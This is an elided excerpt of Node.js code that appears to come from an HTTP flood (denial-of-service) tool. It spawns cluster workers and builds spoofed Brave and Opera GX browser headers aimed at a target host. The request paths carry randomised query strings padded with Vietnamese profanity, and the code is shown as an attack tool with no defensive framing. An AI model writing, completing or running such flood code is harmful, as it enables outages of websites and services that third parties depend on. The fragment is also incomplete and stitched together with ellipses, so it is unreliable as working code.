...
if (cluster.isMaster) {
    ...
    console.log(`--------------------------------------------`);
    console.log(`Note: Only work on http/2 or http/1.1 `);
...
const generateHeaders = (browser) => {
    ...
    const headersMap = {
        brave: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '' : '') : (''+ parsedTarget.host + (Math.random() < 0.5 ? '' : '')),
            ":scheme": "https",
            ":path": parsedTarget.path + "?q=Famod_Sex_" + generateRandomString(1,10) + '&Concac=' +  generateRandomString(1,12) + '=DauBuoi&' + generateRandomString(1,12),
        ...
        operagx: {
            ...
            ":authority":Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '' : '') : (''+ parsedTarget.host + (Math.random() < 0.5 ? '' : '')),
            ":scheme": "https",
            ":path": parsedTarget.path + "?q=Famod_Pro_" + generateRandomString(1,10) + '&Concac=' +  generateRandomString(1,12) + '=DauBuoi&' + generateRandomString(1,12),
